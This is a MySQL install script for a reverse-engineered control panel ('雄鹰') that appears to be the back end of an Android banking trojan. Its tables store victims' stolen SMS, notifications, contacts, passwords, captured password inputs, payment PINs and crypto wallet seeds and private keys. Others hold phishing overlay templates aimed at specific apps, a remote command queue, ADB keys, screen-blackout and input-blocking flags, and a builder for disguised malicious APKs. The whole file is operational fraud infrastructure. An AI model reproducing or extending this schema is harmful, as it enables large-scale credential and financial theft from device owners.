-- 雄鹰本地面板反推安装表结构
-- 可重复执行；用于 install.php 初始化 MySQL。
SET NAMES utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(64) NOT NULL UNIQUE,
  password_hash VARCHAR(255) NOT NULL,
  role VARCHAR(32) NOT NULL DEFAULT 'user',
  permissions TEXT NULL,
  max_devices INT DEFAULT 100,
  max_sub_users INT NULL,
  parent_username VARCHAR(64) DEFAULT '',
  enabled TINYINT DEFAULT 1,
  expire_at BIGINT DEFAULT 0,
  avatar VARCHAR(255) DEFAULT '',
  telegram_chat_id VARCHAR(64) DEFAULT '',
  last_login BIGINT DEFAULT 0,
  created_at BIGINT DEFAULT 0,
  updated_at BIGINT DEFAULT 0,
  INDEX idx_username (username),
  INDEX idx_parent (parent_username)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_settings (
  id INT AUTO_INCREMENT PRIMARY KEY,
  `key` VARCHAR(191) NOT NULL UNIQUE,
  `value` MEDIUMTEXT NULL,
  created_at BIGINT DEFAULT 0,
  updated_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_login_logs (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(64) DEFAULT '',
  ip VARCHAR(64) DEFAULT '',
  user_agent VARCHAR(255) DEFAULT '',
  success TINYINT DEFAULT 0,
  created_at BIGINT DEFAULT 0,
  INDEX idx_created (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_devices (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) NOT NULL UNIQUE,
  owner_username VARCHAR(64) DEFAULT 'admin',
  remark VARCHAR(255) DEFAULT '',
  real_name VARCHAR(255) DEFAULT '',
  group_name VARCHAR(128) DEFAULT '',
  brand VARCHAR(64) DEFAULT '', model VARCHAR(128) DEFAULT '', manufacturer VARCHAR(128) DEFAULT '',
  os_version VARCHAR(64) DEFAULT '', sdk_version INT DEFAULT 0,
  app_version VARCHAR(64) DEFAULT '', app_name VARCHAR(128) DEFAULT '', package_name VARCHAR(255) DEFAULT '',
  battery_level INT DEFAULT 0, is_charging TINYINT DEFAULT 0,
  is_connected TINYINT DEFAULT 0, is_screen_on TINYINT DEFAULT 0, is_locked TINYINT DEFAULT 0,
  accessibility_alive TINYINT DEFAULT 0, permissions TEXT NULL,
  is_device_owner TINYINT DEFAULT 0, device_input_blocked TINYINT DEFAULT 0, black_screen_active TINYINT DEFAULT 0,
  adb_enabled TINYINT DEFAULT 0, adb_wifi_enabled TINYINT DEFAULT 0, adb_deploy_enabled TINYINT DEFAULT 0,
  wifi_port INT DEFAULT 0, remote_port INT DEFAULT 0, debug_port INT DEFAULT 0,
  country VARCHAR(64) DEFAULT '', province VARCHAR(64) DEFAULT '', city VARCHAR(64) DEFAULT '',
  ip VARCHAR(64) DEFAULT '', public_ip VARCHAR(64) DEFAULT '', network_type VARCHAR(64) DEFAULT '',
  screen_width INT DEFAULT 0, screen_height INT DEFAULT 0, density VARCHAR(32) DEFAULT '',
  storage_total BIGINT DEFAULT 0, storage_free BIGINT DEFAULT 0,
  cpu_info VARCHAR(255) DEFAULT '', mem_total BIGINT DEFAULT 0, mem_free BIGINT DEFAULT 0,
  tpx_running TINYINT DEFAULT 0, dxs_running TINYINT DEFAULT 0, minicap_mode VARCHAR(32) DEFAULT '',
  last_seen BIGINT DEFAULT 0, first_seen BIGINT DEFAULT 0, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
  custom_info MEDIUMTEXT NULL,
  INDEX idx_owner (owner_username), INDEX idx_online (is_connected), INDEX idx_seen (last_seen)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_device_groups (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(128) NOT NULL UNIQUE,
  sort_order INT DEFAULT 0,
  created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_pending_commands (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '',
  command_json MEDIUMTEXT NULL,
  status VARCHAR(32) DEFAULT 'pending',
  result MEDIUMTEXT NULL,
  picked_at BIGINT NULL,
  created_at BIGINT DEFAULT 0,
  updated_at BIGINT DEFAULT 0,
  INDEX idx_device_pick (device_id, picked_at), INDEX idx_created (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_cmd_results (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', command_id VARCHAR(128) DEFAULT '', command VARCHAR(128) DEFAULT '',
  success TINYINT DEFAULT 0, result MEDIUMTEXT NULL, created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id), INDEX idx_cmd (command_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_sms_messages (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', sender VARCHAR(128) DEFAULT '', phone VARCHAR(128) DEFAULT '',
  content MEDIUMTEXT NULL, body MEDIUMTEXT NULL, timestamp BIGINT DEFAULT 0,
  read_status TINYINT DEFAULT 0, created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id), INDEX idx_created (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_notifications (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '',
  title TEXT NULL, content MEDIUMTEXT NULL, extras MEDIUMTEXT NULL,
  timestamp BIGINT DEFAULT 0, created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id), INDEX idx_pkg (package_name)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_contacts (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', name VARCHAR(255) DEFAULT '', phone VARCHAR(128) DEFAULT '', email VARCHAR(255) DEFAULT '',
  data_json MEDIUMTEXT NULL, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_passwords (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', account VARCHAR(255) DEFAULT '', username VARCHAR(255) DEFAULT '',
  password TEXT NULL, password_type VARCHAR(64) DEFAULT '', app_name VARCHAR(255) DEFAULT '', package_name VARCHAR(255) DEFAULT '',
  extra MEDIUMTEXT NULL, created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_password_inputs (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', password TEXT NULL, password_type VARCHAR(64) DEFAULT '',
  package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '', window_title VARCHAR(255) DEFAULT '',
  created_at BIGINT DEFAULT 0, INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_payment_cipher_records (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', cipher TEXT NULL, payment_type VARCHAR(64) DEFAULT '',
  package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '', amount VARCHAR(64) DEFAULT '',
  created_at BIGINT DEFAULT 0, INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_injection_templates (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(255) DEFAULT '', package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '',
  html_content LONGTEXT NULL, htmlContent LONGTEXT NULL, enabled TINYINT DEFAULT 1,
  owner_username VARCHAR(64) DEFAULT '', created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
  INDEX idx_package (package_name)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_injection_data (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', template_id INT DEFAULT 0, package_name VARCHAR(255) DEFAULT '',
  data_json MEDIUMTEXT NULL, content MEDIUMTEXT NULL, account VARCHAR(255) DEFAULT '', password TEXT NULL,
  created_at BIGINT DEFAULT 0, INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_active_injection_tasks (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', package_name VARCHAR(255) DEFAULT '', template_id INT DEFAULT 0,
  created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
  UNIQUE KEY uniq_task (device_id, package_name)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_device_apps (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '',
  version_name VARCHAR(128) DEFAULT '', version_code VARCHAR(64) DEFAULT '', is_system TINYINT DEFAULT 0,
  enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id), INDEX idx_package (package_name)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_operation_logs (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', action VARCHAR(255) DEFAULT '', log_type VARCHAR(64) DEFAULT '',
  details MEDIUMTEXT NULL, created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id), INDEX idx_created (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_bridge_logs (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', direction VARCHAR(32) DEFAULT '', message MEDIUMTEXT NULL,
  created_at BIGINT DEFAULT 0, INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_adb_keys (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', public_key MEDIUMTEXT NULL, private_key MEDIUMTEXT NULL,
  port INT DEFAULT 0, name VARCHAR(255) DEFAULT '', created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_apk_builds (
  id INT AUTO_INCREMENT PRIMARY KEY,
  filename VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '', package_name VARCHAR(255) DEFAULT '',
  server_url TEXT NULL, web_url TEXT NULL, version_name VARCHAR(64) DEFAULT '', owner_username VARCHAR(64) DEFAULT '',
  status VARCHAR(32) DEFAULT 'pending', progress INT DEFAULT 0, message TEXT NULL, error TEXT NULL,
  build_log MEDIUMTEXT NULL, out_path TEXT NULL, download_url TEXT NULL, file_size BIGINT DEFAULT 0,
  created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
  INDEX idx_created (created_at), INDEX idx_status (status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_apk_build_configs (
  id INT AUTO_INCREMENT PRIMARY KEY,
  build_id INT NULL, app_name VARCHAR(255) DEFAULT '', package_name VARCHAR(255) DEFAULT '', version_name VARCHAR(64) DEFAULT '',
  server_url TEXT NULL, web_url TEXT NULL, icon_path TEXT NULL, bg_path TEXT NULL,
  enable_config_mask TINYINT DEFAULT 0, config_mask_text TEXT NULL, config_mask_subtitle TEXT NULL,
  show_app_icon TINYINT DEFAULT 1, uninstall_mode TINYINT DEFAULT 0, enable_service_mode TINYINT DEFAULT 0,
  uninstall_style VARCHAR(64) DEFAULT '', loading_tips MEDIUMTEXT NULL, page_style_config MEDIUMTEXT NULL,
  uninstall_overlay_texts MEDIUMTEXT NULL, config_json MEDIUMTEXT NULL,
  created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0,
  INDEX idx_build (build_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_ai_config (
  id INT AUTO_INCREMENT PRIMARY KEY,
  config_key VARCHAR(191) NOT NULL UNIQUE, config_value MEDIUMTEXT NULL, updated_at VARCHAR(64) DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_ai_reports (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', report LONGTEXT NULL, result LONGTEXT NULL, created_at VARCHAR(64) DEFAULT '',
  INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_ai_templates (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(255) DEFAULT '', prompt MEDIUMTEXT NULL, content MEDIUMTEXT NULL, created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_ai_device_data (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', data_type VARCHAR(64) DEFAULT '', data_json LONGTEXT NULL, data_count INT DEFAULT 0,
  updated_at BIGINT DEFAULT 0, UNIQUE KEY uniq_device_type (device_id, data_type)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_black_apps (
  id INT AUTO_INCREMENT PRIMARY KEY,
  app_name VARCHAR(255) DEFAULT '', package_name VARCHAR(255) DEFAULT '', action VARCHAR(64) DEFAULT 'disable', enabled TINYINT DEFAULT 1,
  created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_sensitive_apps (
  id INT AUTO_INCREMENT PRIMARY KEY,
  app_name VARCHAR(255) DEFAULT '', package_name VARCHAR(255) DEFAULT '', enable_delay INT DEFAULT 5000, enabled TINYINT DEFAULT 1,
  created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_payment_strategies (
  id INT AUTO_INCREMENT PRIMARY KEY,
  package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '', window_class TEXT NULL, remark TEXT NULL,
  enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_device_payment_strategy_bindings (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', strategy_id INT DEFAULT 0, created_at BIGINT DEFAULT 0,
  UNIQUE KEY uniq_bind (device_id, strategy_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_ip_blacklist (
  id INT AUTO_INCREMENT PRIMARY KEY,
  ip VARCHAR(64) DEFAULT '', reason TEXT NULL, enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_notices (
  id INT AUTO_INCREMENT PRIMARY KEY,
  title VARCHAR(255) DEFAULT '', content MEDIUMTEXT NULL, enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_sms_notify_keywords (
  id INT AUTO_INCREMENT PRIMARY KEY,
  keyword VARCHAR(255) DEFAULT '', enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_notif_notify_packages (
  id INT AUTO_INCREMENT PRIMARY KEY,
  package_name VARCHAR(255) DEFAULT '', app_name VARCHAR(255) DEFAULT '', enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_notify_rules (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(255) DEFAULT '', rule_type VARCHAR(64) DEFAULT '', keyword VARCHAR(255) DEFAULT '', package_name VARCHAR(255) DEFAULT '', enabled TINYINT DEFAULT 1,
  created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_turn_nodes (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(255) DEFAULT '', host VARCHAR(255) DEFAULT '', port INT DEFAULT 0, username VARCHAR(255) DEFAULT '', password VARCHAR(255) DEFAULT '',
  enabled TINYINT DEFAULT 1, created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_auto_commands (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(255) DEFAULT '', command VARCHAR(255) DEFAULT '', params MEDIUMTEXT NULL, enabled TINYINT DEFAULT 1,
  created_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_phish_tasks (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', template_id INT DEFAULT 0, package_name VARCHAR(255) DEFAULT '', status VARCHAR(64) DEFAULT '',
  created_at BIGINT DEFAULT 0, updated_at BIGINT DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_cryptowallets (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', wallet_type VARCHAR(128) DEFAULT '', address TEXT NULL, mnemonic TEXT NULL, private_key TEXT NULL,
  data_json MEDIUMTEXT NULL, created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_album_items (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(128) DEFAULT '', path TEXT NULL, name VARCHAR(255) DEFAULT '', mime VARCHAR(128) DEFAULT '', size BIGINT DEFAULT 0,
  thumb_path TEXT NULL, url TEXT NULL, created_at BIGINT DEFAULT 0,
  INDEX idx_device (device_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS fisher_app_owner_map (
  id INT AUTO_INCREMENT PRIMARY KEY,
  package_name VARCHAR(255) DEFAULT '', owner_username VARCHAR(64) DEFAULT '', created_at BIGINT DEFAULT 0,
  UNIQUE KEY uniq_pkg_owner (package_name, owner_username)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
